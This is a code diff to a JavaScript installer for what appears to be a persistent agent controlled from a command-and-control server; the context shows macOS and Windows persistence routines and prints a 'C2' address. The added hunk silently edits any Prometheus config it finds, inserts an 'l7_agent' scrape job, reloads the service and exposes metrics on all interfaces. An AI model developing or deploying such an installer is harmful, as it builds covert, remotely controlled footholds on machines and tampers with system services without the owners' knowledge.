@@ -212,8 +212,45 @@ function persistWindows(py) {
     if (PLATFORM === 'darwin') persistMac(py);
     if (PLATFORM === 'win32')  persistWindows(py);
 
+    // ── Optional: configure Prometheus scrape ─────────────────────────────
+    info('Checking for Prometheus...');
+    const promCfgPaths = [
+        '/etc/prometheus/prometheus.yml',
+        '/usr/local/etc/prometheus/prometheus.yml',
+        path.join(os.homedir(), 'prometheus.yml'),
+    ];
+    let promCfg = null;
+    for (const p of promCfgPaths) {
+        if (fs.existsSync(p)) { promCfg = p; break; }
+    }
+    if (promCfg) {
+        try {
+            let cfg = fs.readFileSync(promCfg, 'utf8');
+            if (!cfg.includes('l7_agent')) {
+                const scrapeJob = `\n  - job_name: 'l7_agent'\n    static_configs:\n      - targets: ['localhost:9100']\n`;
+                cfg = cfg.replace(/\nscrape_configs:/, `\nscrape_configs:${scrapeJob}`);
+                fs.writeFileSync(promCfg, cfg);
+                log(`Added l7_agent scrape job to ${promCfg}`);
+                // Reload Prometheus if systemctl is available
+                run('systemctl reload prometheus 2>/dev/null || true', { silent: true });
+                log('Prometheus reloaded — metrics at http://localhost:9100/metrics');
+            } else {
+                log('Prometheus scrape job already present');
+            }
+        } catch (e) {
+            warn('Could not update Prometheus config: ' + e.message);
+        }
+    } else {
+        info('Prometheus not found — agent exposes metrics at http://0.0.0.0:9100/metrics');
+        info('If you install Prometheus later, add this scrape job to prometheus.yml:');
+        console.log(`  - job_name: 'l7_agent'`);
+        console.log(`    static_configs:`);
+        console.log(`      - targets: ['<THIS_HOST>:9100']`);
+    }
+
     console.log(`\n[+] Installation complete.`);
-    console.log(`    Agent dir: ${AGENT_DIR}`);
-    console.log(`    Logs:      ${LOG_FILE}`);
-    console.log(`    C2:        ${C2_BASE}`);
+    console.log(`    Agent dir:   ${AGENT_DIR}`);
+    console.log(`    Logs:        ${LOG_FILE}`);
+    console.log(`    C2:          ${C2_BASE}`);
+    console.log(`    Metrics:     http://0.0.0.0:9100/metrics`);
 })();
